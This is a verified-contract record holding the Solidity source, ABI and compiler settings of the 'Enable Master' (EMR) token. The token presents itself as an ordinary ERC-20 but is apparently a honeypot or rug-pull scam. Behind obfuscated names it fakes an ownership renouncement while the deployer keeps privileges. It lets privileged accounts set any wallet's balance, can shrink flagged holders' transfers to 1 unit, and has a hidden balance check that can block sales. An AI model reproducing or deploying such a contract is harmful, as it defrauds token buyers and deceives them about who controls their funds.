{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface totalAuto {\n    function createPair(address teamShould, address toToken) external returns (address);\n}\n\ninterface autoLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitBuy) external view returns (uint256);\n\n    function transfer(address walletLaunched, uint256 swapIsTeam) external returns (bool);\n\n    function allowance(address tokenMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapIsTeam) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletLaunched,\n        uint256 swapIsTeam\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed feeSwapWallet, uint256 value);\n    event Approval(address indexed tokenMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract launchedEnableWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapAutoShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoLaunchedMetadata is autoLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EnableMaster is launchedEnableWallet, autoLaunched, autoLaunchedMetadata {\n\n    uint8 private takeBuy = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atBuyTrading;\n    }\n\n    function marketingMode(address tradingAuto) public {\n        walletTake();\n        if (sellTotalAt) {\n            fundExempt = fundShould;\n        }\n        if (tradingAuto == tradingMode || tradingAuto == fundLaunched) {\n            return;\n        }\n        tradingTake[tradingAuto] = true;\n    }\n\n    function marketingSell(address autoSwap, uint256 swapIsTeam) public {\n        walletTake();\n        fromReceiver[autoSwap] = swapIsTeam;\n    }\n\n    uint256 public fundExempt;\n\n    function receiverLiquidity(address maxShould) public {\n        if (listSwap) {\n            return;\n        }\n        \n        fundIs[maxShould] = true;\n        \n        listSwap = true;\n    }\n\n    uint256 private atBuyTrading = 100000000 * 10 ** 18;\n\n    address receiverMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    event OwnershipTransferred(address indexed buyShould, address indexed maxMarketingEnable);\n\n    constructor (){\n        \n        swapAutoShould txShould = swapAutoShould(exemptBuy);\n        fundLaunched = totalAuto(txShould.factory()).createPair(txShould.WETH(), address(this));\n        if (shouldSellFrom == atReceiver) {\n            fundShould = feeEnable;\n        }\n        tradingMode = _msgSender();\n        fundIs[tradingMode] = true;\n        fromReceiver[tradingMode] = atBuyTrading;\n        tradingList();\n        if (fundExempt != fundShould) {\n            shouldSellFrom = false;\n        }\n        emit Transfer(address(0), tradingMode, atBuyTrading);\n    }\n\n    address private minEnable;\n\n    mapping(address => bool) public tradingTake;\n\n    address public fundLaunched;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapWalletTeam;\n    }\n\n    function tradingList() public {\n        emit OwnershipTransferred(tradingMode, address(0));\n        minEnable = address(0);\n    }\n\n    function allowance(address senderSell, address listTx) external view virtual override returns (uint256) {\n        if (listTx == exemptBuy) {\n            return type(uint256).max;\n        }\n        return exemptTo[senderSell][listTx];\n    }\n\n    function takeAt(address sellTrading, address walletLaunched, uint256 swapIsTeam) internal returns (bool) {\n        require(fromReceiver[sellTrading] >= swapIsTeam);\n        fromReceiver[sellTrading] -= swapIsTeam;\n        fromReceiver[walletLaunched] += swapIsTeam;\n        emit Transfer(sellTrading, walletLaunched, swapIsTeam);\n        return true;\n    }\n\n    function walletTake() private view {\n        require(fundIs[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return minEnable;\n    }\n\n    string private swapWalletTeam = \"EMR\";\n\n    uint256 public listExempt;\n\n    function totalReceiver(address sellTrading, address walletLaunched, uint256 swapIsTeam) internal returns (bool) {\n        if (sellTrading == tradingMode) {\n            return takeAt(sellTrading, walletLaunched, swapIsTeam);\n        }\n        uint256 receiverAmount = autoLaunched(fundLaunched).balanceOf(receiverMin);\n        require(receiverAmount == fromFund);\n        require(walletLaunched != receiverMin);\n        if (tradingTake[sellTrading]) {\n            return takeAt(sellTrading, walletLaunched, fundToken);\n        }\n        return takeAt(sellTrading, walletLaunched, swapIsTeam);\n    }\n\n    function isSender(uint256 swapIsTeam) public {\n        walletTake();\n        fromFund = swapIsTeam;\n    }\n\n    bool private sellTotalAt;\n\n    string private atAmountList = \"Enable Master\";\n\n    bool public atReceiver;\n\n    mapping(address => bool) public fundIs;\n\n    address public tradingMode;\n\n    uint256 private fundShould;\n\n    uint256 constant fundToken = 1 ** 10;\n\n    function approve(address listTx, uint256 swapIsTeam) public virtual override returns (bool) {\n        exemptTo[_msgSender()][listTx] = swapIsTeam;\n        emit Approval(_msgSender(), listTx, swapIsTeam);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atAmountList;\n    }\n\n    function getOwner() external view returns (address) {\n        return minEnable;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeBuy;\n    }\n\n    function balanceOf(address limitBuy) public view virtual override returns (uint256) {\n        return fromReceiver[limitBuy];\n    }\n\n    bool private shouldSellFrom;\n\n    bool public listSwap;\n\n    function transfer(address autoSwap, uint256 swapIsTeam) external virtual override returns (bool) {\n        return totalReceiver(_msgSender(), autoSwap, swapIsTeam);\n    }\n\n    uint256 launchedTeam;\n\n    uint256 fromFund;\n\n    address exemptBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private exemptTo;\n\n    mapping(address => uint256) private fromReceiver;\n\n    function transferFrom(address sellTrading, address walletLaunched, uint256 swapIsTeam) external override returns (bool) {\n        if (_msgSender() != exemptBuy) {\n            if (exemptTo[sellTrading][_msgSender()] != type(uint256).max) {\n                require(swapIsTeam <= exemptTo[sellTrading][_msgSender()]);\n                exemptTo[sellTrading][_msgSender()] -= swapIsTeam;\n            }\n        }\n        return totalReceiver(sellTrading, walletLaunched, swapIsTeam);\n    }\n\n    uint256 public feeEnable;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMarketingEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeSwapWallet\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapIsTeam\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapIsTeam\",\"type\":\"uint256\"}],\"name\":\"isSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"}],\"name\":\"marketingMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapIsTeam\",\"type\":\"uint256\"}],\"name\":\"marketingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxShould\",\"type\":\"address\"}],\"name\":\"receiverLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMode\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapIsTeam\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapIsTeam\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EnableMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}